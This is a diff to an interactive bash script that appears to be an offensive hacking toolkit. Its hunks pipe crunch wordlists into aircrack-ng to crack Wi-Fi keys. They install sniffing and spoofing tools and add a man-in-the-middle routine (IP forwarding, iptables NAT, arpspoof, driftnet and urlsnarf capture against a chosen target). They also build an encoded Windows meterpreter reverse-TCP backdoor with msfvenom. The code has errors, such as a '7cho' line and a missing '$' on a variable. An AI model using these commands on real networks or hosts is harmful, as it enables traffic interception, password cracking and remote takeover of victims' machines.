@@ -218,7 +218,10 @@ echo
 echo wep   or wpa
 echo
 echo
+echo
+echo -e  '\e[1;31m '
 read -p 'sercurity : ' ecript
+echo -e  '\e[1;33m '
 crunch 8 25 azertyuioqsdfghjklmwxcvbn01234567890 | aircrack-ng -w - -b $apbssid -a $ecript $filecap1-01.cap
 echo
 echo
@@ -288,12 +291,17 @@ echo [OK] hping3
 apt-get install aircrack-ng
 apt install nmap
 apt-get install driftnet
+apt install driftnet
 apt-get install urlsnarf
+apt install driftnet
 apt install msfvenom
 apt install l2ping
 echo -e  '\e[1;35m '
 apt-get install l2ping
 apt install hcitool
+apt install arpspoof
+apt-get install arpspoof
+clear
 echo '[end]'
 fi
 
@@ -307,16 +315,43 @@ echo -----------------------
 echo    - sniffing mitm -
 echo -----------------------
 echo
+echo  Interface
+echo
+echo -e  '\e[1;31m '
 read -p 'interface : ' interfacesn
+echo -e  '\e[1;37m '
+echo
 echo
 echo ip adress of target
 echo
+echo
+echo -e  '\e[1;31m '
 read -p 'ip : ' ipsn
+echo -e  '\e[1;37m '
+echo
 echo
 echo  file of capture
 echo
+echo
+echo -e  '\e[1;31m '
 read -p 'file : ' sniffcap
-xterm -title sniffing -e "driftnet -i $interfacesn $ipsn >> sniffcap.cap"  | xterm -title sniff -e  "urlsnarf -i $interfacesn $ipsn >> sniffcap.cap"
+echo -e  '\e[1;37m '
+echo
+echo
+echo ip of the routeur
+echo
+7cho
+echo -e  '\e[1;31m '
+read -p 'ip : ' routeursn
+echo -e  '\e[1;37m '
+echo
+echo
+sysctl net.ipv4.ip_forward=1
+iptables -t nat -A POSTROUTING -o eth1 -j MASQUERADE
+iptables -A FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
+iptables -A FORWARD -i $interfacesn -o eth1 -j ACCEPT
+mkdir capture-sniffing
+xterm -title sniff1 -e arpspoof -i interfacesn -t $routeursn $ipsn | xterm -title sniffing -e "driftnet -i $interfacesn $ipsn >> capture-sniffing/$sniffcap.cap" | xterm -title sniff -e  "urlsnarf -i $interfacesn $ipsn >> capture-sniffing/$sniffcap.cap"
 fi
 
 
@@ -417,7 +452,7 @@ read -p 'name : ' namebd
 
 if [ $osbd = "windows" ] 
 then
-msfvenom -p $osbd/meterpreter/reverse_tcp lhost=$hostbd -a x86 --encoder cmd/powershell_base64 lport=$portbd > $namebd.exe
+msfvenom -p $osbd/meterpreter/reverse_tcp lhost=$hostbd -a x86 --encoder cmd/powershell_base64 -i 58 lport=$portbd > $namebd.exe
 fi
 
 if [ $osbd = "android" ]
